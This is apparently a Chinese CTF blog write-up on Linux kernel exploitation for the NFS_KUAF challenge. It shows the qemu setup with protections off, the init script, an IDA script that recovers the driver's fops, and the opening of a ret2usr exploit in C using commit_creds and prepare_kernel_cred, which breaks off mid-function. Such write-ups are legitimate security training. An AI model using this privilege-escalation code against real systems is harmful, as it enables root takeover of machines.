    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  

  


<!-- Add header for code snippets -->



<!-- Create heading anchors -->





  
  

  
    
    

    
      
        
        
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    

    
  

  
  

  
    
    

    
      
        
        
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    

    
  

  
  

  

  
  

  




<!-- return -->




<article class="px-1">
  <header>
    <h1 data-toc-skip>Kernel Pwn 刷题记录</h1>

    <div class="post-meta text-muted">
      <!-- published date -->
      <span>
        发表于
        <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1740499200"
  data-df="YYYY/MM/DD"
  
    data-bs-toggle="tooltip" data-bs-placement="bottom"
  
>
  2025/02/26
</time>

      </span>

      <!-- lastmod date -->
      

      
        
        
        

        

        <div class="mt-3 mb-3">
          <a href="/assets/img/2025-CTFWP-images/2025-02-26-kernel_Pwn_1/icon.png" class="popup img-link preview-img shimmer"><img src="/assets/img/2025-CTFWP-images/2025-02-26-kernel_Pwn_1/icon.png"  alt="Preview Image" width="1200" height="630"  loading="lazy"></a></div>
      

      <div class="d-flex justify-content-between">
        <!-- author(s) -->
        <span>
          

          作者

          <em>
            
              
                
                
              
            
          </em>
        </span>

        <!-- read time -->
        <!-- Calculate the post's reading time, and display the word count in tooltip -->



<!-- words per minute -->










<!-- return element -->
<span
  class="readtime"
  data-bs-toggle="tooltip"
  data-bs-placement="bottom"
  title="14527 字"
>
  <em>80 分钟</em>阅读</span>

      </div>
      <!-- .d-flex -->
    </div>
    <!-- .post-meta -->
  </header>

  <div class="content">
    <p>‍</p>

<h2 id="添加到启动脚本"><span class="me-2">添加到启动脚本</span><a href="#添加到启动脚本" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
</pre></td><td class="rouge-code"><pre>
<span class="k">if</span> <span class="o">[</span> <span class="o">!</span> <span class="nt">-d</span> <span class="s2">"./rootfs/"</span> <span class="o">]</span><span class="p">;</span><span class="k">then
    </span><span class="nb">mkdir</span> ./rootfs/
    <span class="nb">pushd </span>rootfs
    cpio <span class="nt">-idmv</span> &lt; ../rootfs.cpio
    <span class="nb">popd
</span><span class="k">fi
if</span> <span class="o">[</span> <span class="o">!</span> <span class="nt">-d</span> <span class="s2">"./exp/"</span> <span class="o">]</span><span class="p">;</span><span class="k">then
    </span><span class="nb">mkdir</span> ./exp/
    <span class="nb">pushd </span>exp
    <span class="nb">cp</span> /opt/kernel_exp/<span class="k">*</span> <span class="nb">.</span>
    <span class="nb">popd
</span><span class="k">fi

</span><span class="nb">pushd </span>exp
make
<span class="nb">cp </span>exploit ../rootfs/
<span class="nb">popd

pushd </span>rootfs
find ./<span class="k">*</span> | cpio <span class="nt">-H</span> newc <span class="nt">-o</span> <span class="o">&gt;</span> ../rootfs.cpio
<span class="nb">popd</span>
</pre></td></tr></tbody></table></code></div></div>

<p>‍</p>

<h2 id="attach"><span class="me-2">attach</span><a href="#attach" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<p>‍</p>

<div class="language-python highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
</pre></td><td class="rouge-code"><pre><span class="n">python</span>
<span class="kn">import</span> <span class="n">os</span>
<span class="n">end</span>

<span class="nb">file</span> <span class="p">.</span><span class="o">/</span><span class="n">vmlinux</span>
<span class="n">target</span> <span class="n">remote</span> <span class="p">:</span><span class="mi">1234</span>


<span class="n">python</span>
<span class="kn">import</span> <span class="n">gdb</span>
<span class="c1">#inferior = gdb.inferiors()[0]
## (&lt;gdb.Inferior num=1, pid=1&gt;,)
#field = gdb.parse_and_eval('*(struct module)0').tyep.fields()
#print('--',field,'---')
</span><span class="n">breakpoint</span> <span class="o">=</span> <span class="sh">'''</span><span class="s">
#b *__x64_sys_flitbip
co
</span><span class="sh">'''</span>
<span class="n">gdb</span><span class="p">.</span><span class="nf">execute</span><span class="p">(</span><span class="n">breakpoint</span><span class="p">)</span>
<span class="n">end</span>
</pre></td></tr></tbody></table></code></div></div>

<p>‍</p>

<p>‍</p>

<h2 id="nfs_kuaf"><span class="me-2">NFS_KUAF</span><a href="#nfs_kuaf" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<p>‍</p>

<ul>
  <li>第四届“长城杯”网络安全大赛 暨京津冀网络安全技能竞赛（决赛）</li>
</ul>

<p>‍</p>

<h3 id="附件"><span class="me-2">附件</span><a href="#附件" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>‍</p>

<p>​<a href="/assets/img/2025-CTFWP-images/2025-02-26-kernel_Pwn_1/assets/image-20240914192514-fqsy9qy.png" class="popup img-link  shimmer"><img src="/assets/img/2025-CTFWP-images/2025-02-26-kernel_Pwn_1/assets/image-20240914192514-fqsy9qy.png" alt="image" loading="lazy"></a>​</p>

<p>‍</p>

<p>‍</p>

<h3 id="保护及init分析"><span class="me-2">保护及init分析</span><a href="#保护及init分析" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>‍</p>

<ul>
  <li>启动保护</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre></td><td class="rouge-code"><pre>qemu-system-x86_64 <span class="se">\</span>
    <span class="nt">-m</span> 256M <span class="se">\</span>
    <span class="nt">-kernel</span> bzImage <span class="se">\</span>
    <span class="nt">-initrd</span> rootfs.cpio <span class="se">\</span>
    <span class="nt">-monitor</span> /dev/null <span class="se">\</span>
    <span class="nt">-append</span> <span class="s2">"root=/dev/ram console=ttyS0 loglevel=8 earlyprintk=serial,ttyS0,115200 nokaslr pti=off"</span> <span class="se">\</span>
    <span class="nt">-cpu</span> kvm64,-smep,-smap <span class="se">\</span>
    <span class="nt">-netdev</span> user,id<span class="o">=</span>t0, <span class="nt">-device</span> e1000,netdev<span class="o">=</span>t0,id<span class="o">=</span>nic0 <span class="se">\</span>
    <span class="nt">-nographic</span> <span class="se">\</span>
    <span class="nt">-s</span> <span class="se">\</span>
    <span class="nt">-no-reboot</span>
</pre></td></tr></tbody></table></code></div></div>

<ul>
  <li>
    <p>nokaslr 关闭了kernel地址随机化，在未开启KASLR保护机制时，内核代码段的基址为 <code class="language-plaintext highlighter-rouge">0xffffffff81000000</code>​ ，direct mapping area 的基址为 <code class="language-plaintext highlighter-rouge">0xffff888000000000</code>​</p>
  </li>
  <li>
    <p>smep 和 smap 通常是一起出现的，这里是个减号，所以 保护是关闭的，也就意味着 <code class="language-plaintext highlighter-rouge">内核态可以直接跳到用户空间代码段执行</code>​</p>
  </li>
</ul>

<p>‍</p>

<ul>
  <li>init 文件</li>
</ul>

<p>‍</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
</pre></td><td class="rouge-code"><pre><span class="c">#!/bin/sh</span>

<span class="nb">mkdir</span> /tmp
<span class="nb">mkdir</span> /proc
<span class="nb">mkdir</span> /sys
mount <span class="nt">-t</span> proc none /proc
mount <span class="nt">-t</span> sysfs none /sys
mount <span class="nt">-t</span> debugfs none /sys/kernel/debug
mount <span class="nt">-t</span> devtmpfs devtmpfs /dev
mount <span class="nt">-t</span> tmpfs none /tmp
mdev <span class="nt">-s</span>
<span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"Boot took </span><span class="si">$(</span><span class="nb">cut</span> <span class="nt">-d</span><span class="s1">' '</span> <span class="nt">-f1</span> /proc/uptime<span class="si">)</span><span class="s2"> seconds"</span>

insmod /lib/modules/5.4.0-100-generic/kernel/test.ko <span class="c"># 应该就是存在漏洞的驱动了</span>
<span class="nb">chmod </span>666 /dev/uaf_device <span class="c"># 漏洞驱动</span>

setsid /bin/cttyhack setuidgid 1000 /bin/sh

poweroff <span class="nt">-d</span> 0  <span class="nt">-f</span>

</pre></td></tr></tbody></table></code></div></div>

<p>‍</p>

<h3 id="提取-vmlinux"><span class="me-2">提取 vmlinux</span><a href="#提取-vmlinux" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<ul>
  <li>用于调试 kernel</li>
</ul>

<p>​<a href="/assets/img/2025-CTFWP-images/2025-02-26-kernel_Pwn_1/assets/image-20240914192608-s0v8jy7.png" class="popup img-link  shimmer"><img src="/assets/img/2025-CTFWP-images/2025-02-26-kernel_Pwn_1/assets/image-20240914192608-s0v8jy7.png" alt="image" loading="lazy"></a>​</p>

<p>‍</p>

<p>‍</p>

<h3 id="分析ko-文件"><span class="me-2">分析.ko 文件</span><a href="#分析ko-文件" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>‍</p>

<p>.ko 文件被去符号表了，可以通过 fops 结构体去恢复</p>

<ul>
  <li>ida 恢复 fops 脚本</li>
</ul>

<div class="language-python highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre></td><td class="rouge-code"><pre><span class="n">struct_name</span> <span class="o">=</span><span class="sh">'''</span><span class="s">owner llseek read write read_iter write_iter iopoll iterate
iterate_shared poll unlocked_ioctl compat_ioctl mmap mmap_supported_flags
open flush release fsync fasync lock sendpage get_unmapped_area check_flags
flock splice_write splice_read setlease fallocate show_fdinfo copy_file_range
remap_file_range fadvise</span><span class="sh">'''</span><span class="p">.</span><span class="nf">split</span><span class="p">(</span><span class="sh">'</span><span class="s"> </span><span class="sh">'</span><span class="p">)</span>

<span class="n">fops_address</span> <span class="o">=</span> <span class="mh">0x560</span>
<span class="n">ida_name</span><span class="p">.</span><span class="nf">set_name</span><span class="p">(</span><span class="n">fops_address</span><span class="p">,</span> <span class="sh">'</span><span class="s">fops</span><span class="sh">'</span><span class="p">)</span>
<span class="k">for</span> <span class="n">offset</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nf">len</span><span class="p">(</span><span class="n">struct_name</span><span class="p">)):</span>
    <span class="n">next_ptr</span> <span class="o">=</span> <span class="n">ida_bytes</span><span class="p">.</span><span class="nf">get_qword</span><span class="p">(</span><span class="n">fops_address</span> <span class="o">+</span> <span class="n">offset</span> <span class="o">*</span> <span class="mi">8</span><span class="p">)</span>
    <span class="nf">if</span><span class="p">(</span><span class="n">next_ptr</span><span class="p">):</span>
        <span class="n">sname</span> <span class="o">=</span> <span class="sh">'</span><span class="s">device_</span><span class="sh">'</span> <span class="o">+</span> <span class="n">struct_name</span><span class="p">[</span><span class="n">offset</span><span class="p">]</span>
        <span class="n">ida_name</span><span class="p">.</span><span class="nf">set_name</span><span class="p">(</span><span class="n">next_ptr</span><span class="p">,</span> <span class="n">sname</span><span class="p">)</span>
        <span class="nf">print</span><span class="p">(</span><span class="nf">hex</span><span class="p">(</span><span class="n">next_ptr</span><span class="p">),</span><span class="sh">'</span><span class="s"> --&gt; </span><span class="sh">'</span><span class="p">,</span><span class="n">sname</span><span class="p">)</span>
</pre></td></tr></tbody></table></code></div></div>

<p>‍</p>

<ul>
  <li>恢复前</li>
</ul>

<p>​<a href="/assets/img/2025-CTFWP-images/2025-02-26-kernel_Pwn_1/assets/image-20240916211100-dv9aus3.png" class="popup img-link  shimmer"><img src="/assets/img/2025-CTFWP-images/2025-02-26-kernel_Pwn_1/assets/image-20240916211100-dv9aus3.png" alt="image" loading="lazy"></a>​</p>

<p>‍</p>

<ul>
  <li>恢复后</li>
</ul>

<p>​<a href="/assets/img/2025-CTFWP-images/2025-02-26-kernel_Pwn_1/assets/image-20240916211043-hxgad7b.png" class="popup img-link  shimmer"><img src="/assets/img/2025-CTFWP-images/2025-02-26-kernel_Pwn_1/assets/image-20240916211043-hxgad7b.png" alt="image" loading="lazy"></a>​</p>

<p>‍</p>

<p>‍</p>

<ul>
  <li>操作分析</li>
</ul>

<p>​<a href="/assets/img/2025-CTFWP-images/2025-02-26-kernel_Pwn_1/assets/image-20240916211332-hovxn87.png" class="popup img-link  shimmer"><img src="/assets/img/2025-CTFWP-images/2025-02-26-kernel_Pwn_1/assets/image-20240916211332-hovxn87.png" alt="image" loading="lazy"></a>​</p>

<p>​<a href="/assets/img/2025-CTFWP-images/2025-02-26-kernel_Pwn_1/assets/image-20240916211442-9zbpq1y.png" class="popup img-link  shimmer"><img src="/assets/img/2025-CTFWP-images/2025-02-26-kernel_Pwn_1/assets/image-20240916211442-9zbpq1y.png" alt="image" loading="lazy"></a>​</p>

<p>‍</p>

<p>‍</p>

<h3 id="整体思路"><span class="me-2">整体思路</span><a href="#整体思路" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>‍</p>

<p>传入一个地址，然后执行，也是比较简单</p>

<p>保护比较低，直接跳到用户态的执行shellcode</p>

<p>‍</p>

<p>‍</p>

<h3 id="exploit"><span class="me-2">exploit</span><a href="#exploit" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<ul>
  <li>exp.c</li>
</ul>

<div class="language-c highlighter-rouge"><div class="code-header">
        <span data-label-text="C"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
</pre></td><td class="rouge-code"><pre><span class="cp">#include</span> <span class="cpf">&lt;stddef.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdint.h&gt;</span><span class="cp">
#include</span> <span class="cpf">"minilib.h"</span><span class="cp">
</span>
<span class="kt">char</span> <span class="n">flag</span><span class="p">[</span><span class="mh">0x50</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>

<span class="kt">size_t</span> <span class="n">kernel_base</span>          <span class="o">=</span> <span class="mh">0xffffffff81000000</span><span class="p">;</span>
<span class="kt">size_t</span> <span class="n">commit_creds</span>         <span class="o">=</span> <span class="mh">0xffffffff810c5010</span><span class="p">;</span>
<span class="kt">size_t</span> <span class="n">prepare_kernel_cred</span>  <span class="o">=</span> <span class="mh">0xffffffff810c5270</span><span class="p">;</span>


<span class="kt">size_t</span> <span class="n">user_cs</span><span class="p">,</span> <span class="n">user_ss</span><span class="p">,</span> <span class="n">user_rflags</span><span class="p">,</span> <span class="n">user_sp</span><span class="p">;</span>
<span class="kt">void</span> <span class="nf">save_status</span><span class="p">(){</span>
    <span class="n">asm</span> <span class="k">volatile</span> <span class="p">(</span>
        <span class="s">"mov user_cs, cs;"</span>
        <span class="s">"mov user_ss, ss;"</span>
        <span class="s">"mov user_sp, rsp;"</span>
        <span class="s">"pushf;"</span>
        <span class="s">"pop user_rflags;"</span>
    <span class="p">);</span>
